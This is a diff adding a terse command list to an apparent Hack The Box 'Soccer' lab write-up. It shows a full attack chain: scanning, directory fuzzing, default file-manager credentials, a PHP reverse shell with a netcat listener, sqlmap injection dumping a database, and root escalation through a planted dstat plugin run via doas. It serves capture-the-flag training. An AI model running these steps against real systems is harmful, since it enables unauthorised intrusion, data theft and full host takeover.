@@ -1,5 +1,26 @@
 ```
 nmap -p- -T5 -Pn 10.10.11.194
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://soccer.htb/tiny/FUZZ -fw 4 -e .aspx,.php,.txt,.html,.sh
+google: tiny file manager default credentials
+admin/admin@123
+git clone https://github.com/pentestmonkey/php-reverse-shell.git
+nc -nlvp 4444
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 –batch
+sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump –batch
+ssh player@10.10.11.194
+find / -type f -perm -4000 2>/dev/null
+cat /usr/local/etc/doas.conf
+man dstat
+ls -ld /usr/local/share/dstat
+echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
+doas /usr/bin/dstat –list
+doas /usr/bin/dstat --pwn
+```
+
+
+```
+nmap -p- -T5 -Pn 10.10.11.194
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/b8a88354-8431-4faf-bed1-9189bef20fd4)
 
